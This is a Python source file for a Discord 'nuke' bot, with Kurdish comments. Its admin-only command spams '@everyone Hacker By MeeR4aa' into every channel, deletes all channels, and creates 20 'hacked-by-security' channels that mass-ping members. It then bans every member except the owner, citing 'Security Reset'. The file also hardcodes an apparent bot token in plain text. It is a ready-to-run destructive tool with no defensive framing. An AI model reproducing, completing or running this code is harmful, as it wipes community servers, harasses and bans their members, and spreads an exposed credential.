import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'بۆتەکە ئامادەیە بە ناوی: {bot.user.name}')

@bot.command()
@commands.has_permissions(administrator=True)
async def start_nuke(ctx):
    guild = ctx.guild
    # ١. ئاگادارکردنەوە
    for channel in guild.text_channels:
        try: await channel.send("@everyone Hacker By MeeR4aa")
        except: continue
    # ٢. سڕینەوە
    for channel in guild.channels:
        try: await channel.delete()
        except: continue
    # ٣. دروستکردنی ١٠٠ چەناڵ
    for i in range(20):
        try:
            new_chan = await guild.create_text_channel(f'hacked-by-security-{i}')
            await new_chan.send("@everyone Server Esa sfr abetaua 💀")
        except:
            await asyncio.sleep(0.5)
            continue
    # ٤. باندکردن
    for member in guild.members:
        if member != bot.user and member != guild.owner:
            try: await member.ban(reason="Security Reset")
            except: continue

# لێرە تۆکنەکەت دابنێ
bot.run('MTQ2MDM5NjQ2NjkwMzQ0OTc4NQ.G300Z2.quGk0hY6IDW5oFTeiphGOb7Hc_KQsb_c6pSiCc')
